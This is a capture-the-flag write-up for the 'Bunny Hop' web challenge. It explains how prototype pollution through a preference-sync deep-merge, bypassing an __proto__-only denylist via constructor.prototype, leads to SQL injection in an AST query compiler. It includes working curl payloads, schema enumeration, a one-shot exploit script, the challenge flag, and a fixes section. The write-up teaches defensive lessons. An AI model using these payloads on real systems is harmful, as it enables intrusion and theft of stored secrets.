# Bunny Hop

- **CTF:** BCS CTF
- **Category:** Web
- **Points:** 473 (15 solves)
- **Author:** M Ariful Islam
- **Flag:** `bcsctf{pr0t0_ast_sql1_bun_1sol4t3d_succ355}`

---

## TL;DR

The app is a Bun service that compiles catalog search requests into a SQL query via an
in-memory AST. A deep-merge in the preference-sync endpoint is vulnerable to **prototype
pollution**. The gateway "denylist" that is supposed to block pollution keys is a regex that
only matches `__proto__`, so `constructor.prototype` walks straight through it and pollutes
`Object.prototype`.

The AST compiler reads an *optional* relation property (`compositeRelation`) off the request
object. On a normal request that property is absent, so the lookup falls through the prototype
chain to our polluted value. Its `dataset` and `mapping` fields are emitted **raw** into a
`UNION ALL`, giving full read access to any table — including the `system_configuration`
vault that holds the flag. The "everything is parameterized" claim in the prompt is true for
*values* and is pure misdirection: the injection is in the query **structure**, not the values.

---

## Target

```
http://172.16.38.22:14502
http://172.16.38.21:14502   (identical mirror)
```

Every request must carry an `X-Session-ID` header. Sessions are isolated per worker, so a
polluted prototype only affects your own session's realm — you must pollute and query using
the **same** session ID.

Endpoints:

| Method | Path                     | Purpose |
|--------|--------------------------|---------|
| GET    | `/api/healthz`           | `{"status":"UP","engine":"Bun-JSC"}` |
| POST   | `/api/catalog/query`     | Search catalog: `{category, query, limit, offset}` |
| PATCH  | `/api/preferences/sync`  | Persist prefs (deep-merge): `{viewOptions:{...}}` |

---

## Recon

Baseline query returns four catalog rows with a fixed column set:

```bash
curl -s http://172.16.38.22:14502/api/catalog/query \
  -H 'Content-Type: application/json' -H 'X-Session-ID: t' \
  -d '{"query":"e"}'
# id, sku, name, category, unit_price, available_units  (6 columns, 4 rows)
```

Observations that hold throughout:

- `category` = exact match, `query` = `LIKE` substring on `name`. Both **parameterized**
  (`{"query":"Edge' OR 1=1--"}` → 0 rows, treated as a literal).
- `limit` / `offset` are accepted but ignored. `SELECT`/`FROM` are fixed.

The `/api/preferences/sync` endpoint does a **recursive deep-merge** and echoes the merged
`active` state, which makes it a great oracle:

```bash
curl -s -X PATCH .../api/preferences/sync -H 'Content-Type: application/json' \
  -H 'X-Session-ID: t' -d '{"viewOptions":{"foo":{"bar":1}},"theme":"dark"}'
# -> merged & echoed back, arbitrary nested keys accepted
```

---

## Step 1 — Bypassing the hydration filter (prototype pollution)

Probing which keys survive the merge shows the gateway strips **only** `__proto__`:

```bash
curl -s -X PATCH .../api/preferences/sync -H 'Content-Type: application/json' \
  -H 'X-Session-ID: t' \
  -d '{"__proto__":"P","constructor":"C","prototype":"PR",
       "viewOptions":{"__proto__":{"x":1},"constructor":{"y":1},"prototype":{"z":1}}}'
# __proto__ removed; constructor / prototype pass through
```

Because the merge is roughly `target[k] = target[k] || {}; recurse(...)`, sending
`constructor.prototype.<x>` recurses into `Object` → `Object.prototype` and sets `x` there.

**Proof the pollution reaches the query engine** — polluting the query's own parameters and
then sending an empty body still filters, because the compiler reads `criteria.query` /
`criteria.category` off the (now polluted) prototype:

```bash
# pollute
curl -s -X PATCH .../api/preferences/sync -H 'Content-Type: application/json' -H 'X-Session-ID: t' \
  -d '{"viewOptions":{"constructor":{"prototype":{"query":"Edge"}}}}'
# empty query body now returns only "Edge"
curl -s -X POST .../api/catalog/query -H 'Content-Type: application/json' -H 'X-Session-ID: t' -d '{}'
# -> count: 1
```

### Reversing the internals via error-leaked source

Bun error messages quote the offending source expression. By polluting `Array.prototype`
(seed an array value first, then pollute *its* `constructor.prototype`) we can overwrite an
array method with a non-function and read back the exact code that used it:

```bash
# seed an array, then break Array.prototype.push
curl -s -X PATCH .../api/preferences/sync -H 'Content-Type: application/json' -H 'X-Session-ID: t' \
  -d '{"viewOptions":{"seed":[1]}}'
curl -s -X PATCH .../api/preferences/sync -H 'Content-Type: application/json' -H 'X-Session-ID: t' \
  -d '{"viewOptions":{"seed":{"constructor":{"prototype":{"push":"PWN"}}}}}'
curl -s -X POST .../api/catalog/query -H 'Content-Type: application/json' -H 'X-Session-ID: t' -d '{"query":"e"}'
```

Leaked fragments (breaking `push`, `join`, `map`, `some`):

```
ast.filterTree.push({ field: "name",     operator: "CONTAINS", value: criteria.query })
ast.filterTree.push({ field: "category", operator: "EQUALS",   value: criteria.category })
ast.projectionFields.join(", ")        // SELECT list
predicates.join(" AND ")               // WHERE
this.DENYLIST_PATTERNS.some(p => p.test(key))          // the (regex) filter
node.map(item => this.processInboundPayload(item))     // the hydrator
```

This confirms the AST shape (`{field, operator, value}`) and that values are parameterized.
The injectable surface is a property the compiler reads but never sets — an object property
"assumed pristine."

---

## Step 2 — The AST sink: `compositeRelation`

The compiler reads an optional relation off the request. Because it is absent on normal
requests, `criteria.compositeRelation` resolves through the prototype chain. Pollute it:

```bash
curl -s -X PATCH http://172.16.38.22:14502/api/preferences/sync \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' \
  -d '{"constructor":{"prototype":{"compositeRelation":{"dataset":"x","mapping":"1"}}}}'

curl -s -X POST http://172.16.38.22:14502/api/catalog/query \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' -d '{}'
# -> {"error":"no such table: x"}
```

`dataset` is concatenated **raw** as a table name, and errors are returned verbatim. Trying a
real table shows the mechanism is a `UNION ALL`:

```bash
# dataset = sqlite_master
# -> {"error":"SELECTs to the left and right of UNION ALL do not have the same number of result columns"}
```

So the compiled query is effectively:

```sql
SELECT id, sku, name, category, unit_price, available_units
FROM catalog_inventory
WHERE <predicates>
UNION ALL
SELECT <mapping> FROM <dataset>
```

`mapping` is the injected UNION SELECT list and must supply **6** columns to match the
catalog projection. Result columns map positionally onto
`id, sku, name, category, unit_price, available_units`.

---

## Step 3 — Enumerate the schema

Dump `sqlite_master` with the table name and CREATE statement in visible positions:

```bash
curl -s -X PATCH http://172.16.38.22:14502/api/preferences/sync \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' \
  -d '{"constructor":{"prototype":{"compositeRelation":{"dataset":"sqlite_master","mapping":"1, name, sql, type, tbl_name, rootpage"}}}}'

curl -s -X POST http://172.16.38.22:14502/api/catalog/query \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' -d '{}'
```

Reveals the vault table:

```sql
CREATE TABLE system_configuration (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  config_key TEXT NOT NULL UNIQUE,
  config_value TEXT NOT NULL,
  security_scope TEXT NOT NULL,
  is_encrypted INTEGER DEFAULT 0
)
```

---

## Step 4 — Exfiltrate the flag

Union six columns from `system_configuration` (pad to 6):

```bash
curl -s -X PATCH http://172.16.38.22:14502/api/preferences/sync \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' \
  -d '{"constructor":{"prototype":{"compositeRelation":{"dataset":"system_configuration","mapping":"id, config_key, config_value, security_scope, is_encrypted, id"}}}}'

curl -s -X POST http://172.16.38.22:14502/api/catalog/query \
  -H 'Content-Type: application/json' -H 'X-Session-ID: myteam' -d '{}'
```

Vault rows appear alongside the catalog (`config_key` → `sku`, `config_value` → `name`):

```
CORE_PROVISIONING_TOKEN      bcsctf{pr0t0_ast_sql1_bun_1sol4t3d_succ355}   RESTRICTED
TELEMETRY_SAMPLE_RATE        0.05                                          PUBLIC
FAILOVER_RETRY_INTERVAL_MS   3000                                          INTERNAL
```

### Flag

```
bcsctf{pr0t0_ast_sql1_bun_1sol4t3d_succ355}
```

---

## Full exploit (one shot)

```bash
#!/usr/bin/env bash
S=http://172.16.38.22:14502
SID=myteam

curl -s -X PATCH $S/api/preferences/sync -H 'Content-Type: application/json' -H "X-Session-ID: $SID" \
  -d '{"constructor":{"prototype":{"compositeRelation":{"dataset":"system_configuration","mapping":"id, config_key, config_value, security_scope, is_encrypted, id"}}}}' >/dev/null

curl -s -X POST $S/api/catalog/query -H 'Content-Type: application/json' -H "X-Session-ID: $SID" -d '{}' \
  | grep -o 'bcsctf{[^}]*}'
```

---

## Why it works / root cause

1. **Weak denylist.** The pollution filter is `DENYLIST_PATTERNS.some(p => p.test(key))`, a
   regex list that only anticipated `__proto__`. `constructor` / `prototype` are not covered,
   so the classic `constructor.prototype` bypass pollutes `Object.prototype`.
2. **Unsafe deep-merge.** The preference-sync merge (`target[k] = target[k] || {}; recurse`)
   walks into `constructor.prototype` and writes attacker-controlled keys onto
   `Object.prototype`.
3. **AST reads a "pristine" optional property.** The query compiler looks up
   `criteria.compositeRelation` (and its `dataset` / `mapping` fields) without an own-property
   check. Absent on real requests, it resolves via the polluted prototype and is emitted
   **raw** into a `UNION ALL` — SQL injection despite fully parameterized *values*.

## Fixes

- Reject `constructor` / `prototype` (and use `Object.create(null)` maps / `Map`), or use a
  merge that only copies own properties and refuses these keys explicitly.
- Never build SQL identifiers/relations from untrusted objects; validate `dataset`/`mapping`
  against an allowlist and quote identifiers.
- Read config with `Object.hasOwn(criteria, "compositeRelation")` instead of a bare property
  access, so a polluted prototype cannot supply it.
- Restrict the DB role so the catalog query cannot read `system_configuration`.

## Notes / rabbit holes

- The prompt's emphasis on "strict parameterized statements" and "shell execution absent" is
  misdirection: values *are* parameterized; the bug is structural (raw identifiers/relation).
- Sessions are isolated realms — always pollute and query with the **same** `X-Session-ID`.
- Hanging responses during testing were worker-pool saturation from earlier requests, not real
  signals; verify findings on a healthy pool.
